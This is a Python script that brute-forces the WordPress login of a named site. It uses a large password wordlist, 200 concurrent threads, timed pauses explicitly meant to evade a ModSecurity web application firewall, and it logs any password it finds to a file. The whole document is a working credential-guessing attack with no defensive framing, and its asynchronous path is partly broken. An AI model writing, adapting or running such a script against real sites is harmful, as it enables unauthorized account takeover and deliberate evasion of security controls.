from asyncio import futures
import requests
import aiohttp
import asyncio
import concurrent
from concurrent.futures import ThreadPoolExecutor
import time
from datetime import datetime

def get_post_data(password):
    data = {
        'log': 'cybersecurity',
        'pwd': f'{password}',
        'wp-submit': 'Log In',
        'redirect_to': 'https://rs11.glorifykickstarter.com/wp-admin.php',
        'testcookie': '1'
        }
    return data

def guess_password(bruteforce_url, data, headers, cookies):
    response = requests.post(
        url=bruteforce_url, data=data, cookies=cookies, headers=headers
        )
    return response

async def async_guess_password(session, bruteforce_url, data, headers, cookies):
    async with session.post(
        url=bruteforce_url, data=data, cookies=cookies, headers=headers
        ) as response:
        return response.json()


async def main(password_list, bruteforce_url, headers, cookies):
    async with aiohttp.ClientSession() as session:
        for password in password_list:
            response = async_guess_password(session, bruteforce_url=bruteforce_url, data=get_post_data(password=password), headers=headers, cookies=cookies)
            print(f"{response['text']}") 


if __name__ == "__main__":
    # initialization
    threads = 200
    bruteforce_url = 'https://rs11.glorifykickstarter.com/wp-login.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
    }
    cookies = {
        'humans_21909': '1',
        'wordpress_test_cookie': 'WP Cookie check',
        'timezone': 'Africa/Cairo'
    }

    password_list = []
    # getting passwords from a file
    with open('/home/kali/wordlists/passwords-large.txt', encoding = 'utf-8') as passwords_file:
        for line in passwords_file.readlines():
            password_list.append(line.rstrip())


    # asyncio.run(
    #     main(password_list=password_list[0:10], bruteforce_url=bruteforce_url,
    #     headers=headers, cookies=cookies)
    # )
    start_index = 500
    step = 100
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for batch in range(start_index, len(password_list), step):
            print(f"batch {batch} started @ {datetime.now().strftime('%H:%M:%S')}")
            future_to_url = {
                executor.submit(guess_password, bruteforce_url, get_post_data(password), headers, cookies)
                for password in password_list[batch:batch+step] 
            }

            completed_futures = enumerate(concurrent.futures.as_completed(future_to_url))
            for index, future in completed_futures:
                index += batch
                try:
                    response = future.result()
                    if response.status_code == 200 :
                        if response.text.find('incorrect') > -1:
                            print(f'request {index}: {response.status_code} but incorrect password')
                        else:
                            print(f'request {index}: {response.status} with correct password! Password: {response.request.data["pwd"]}') 
                            with open('./thepassword.txt', 'w+') as thepassword_file:
                                thepassword_file.write(response.request.data["pwd"])
                    elif response.status_code == 406:
                        print(f'request {index}: {response.status_code}, probably a timeout')
                        with open('./failed_requests.txt', 'a+') as thepassword_file:
                                thepassword_file.write(f"{response.request.data['pwd']}\n")
                except Exception as e:
                    print('Looks like something went wrong:', e)
            
            # sleep for 5 minutes after executing a batch of [step] concurrent requests
            print(f"batch {batch} ended @ {datetime.now().strftime('%H:%M:%S')}")
            print("WAITING for ~ 5 MINTUES BECAUSE OF THE MOD_SECURITY WAF")
            time.sleep(60*6)